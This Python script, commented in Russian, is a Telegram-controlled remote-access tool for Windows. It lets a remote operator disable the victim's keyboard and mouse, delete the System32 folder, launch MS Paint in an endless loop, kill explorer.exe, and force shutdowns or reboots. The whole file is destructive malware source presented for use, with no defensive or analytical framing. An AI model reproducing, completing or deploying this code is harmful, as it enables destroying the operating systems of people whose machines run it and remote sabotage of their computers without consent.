import os
import telebot

token='' # Токен Бота
adm='' # Твой ID
bot = telebot.TeleBot(token)

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(adm, 'напечатайте /help чтобы узнать команды')

@bot.message_handler(commands=['help'])
def help(message):
	bot.send_message(adm, 'Команды:'
	'\n/diskeyboard - отключить клавиатуру'
	'\n/dismouse - отключить мышь'
	'\n/delsys32 - Удалить папку System32'
	'\n/rickroll - Открывает рикрол ссылку'
	'\n/floodpaint - Открывает MS Paint бесконечно раз'
	'\n/killexplorer - убивает процесс explorer.exe'
	'\n/off - Отключить пк'
	'\n/reboot - Перезагрузить')
	
@bot.message_handler(commands=['diskeyboard'])
def diskeyboard(message):
	bot.send_chat_action(adm, 'typing')
	os.system('rundll32 keyboard, disable')
	bot.send_message(adm, 'Выполнено!')

@bot.message_handler(commands=['dismouse'])
def dismouse(message):
	bot.send_chat_action(adm, 'typing')
	os.system('rundll32 mouse, disable')
	bot.send_message(adm, 'Выполнено!')

@bot.message_handler(commands=['delsys32'])
def dismouse(message):
	bot.send_chat_action(adm, 'typing')
	os.system('rd /s /q C:/Windows/System32')
	bot.send_message(adm, 'Выполнено!')

@bot.message_handler(commands=['rickroll'])
def rickroll(message):
	bot.send_chat_action(adm, 'typing')
	os.system('rundll32 url.dll,FileProtocolHandler https://youtu.be/dQw4w9WgXcQ')
	bot.send_message(adm, 'Выполнено!')

@bot.message_handler(commands=['floodpaint'])
def spampaint(message):
	bot.send_chat_action(adm, 'typing')
	bot.send_message(adm, 'Выполняется')
	while True:
		os.startfile('mspaint.exe')

@bot.message_handler(commands=['killexplorer'])
def killexplorer(message):
	bot.send_chat_action(adm, 'typing')
	os.system('taskkill /IM explorer.exe')
	bot.send_message(adm, 'Выполнено!')

@bot.message_handler(commands=['off'])
def off(message):
	bot.send_chat_action(adm, 'typing')
	os.system('shutdown -f')
	bot.send_message(adm, 'Выполнено!')

@bot.message_handler(commands=['reboot'])
def off(message):
	bot.send_chat_action(adm, 'typing')
	os.system('shutdown -f -r')
	bot.send_message(adm, 'Выполнено!')

bot.polling()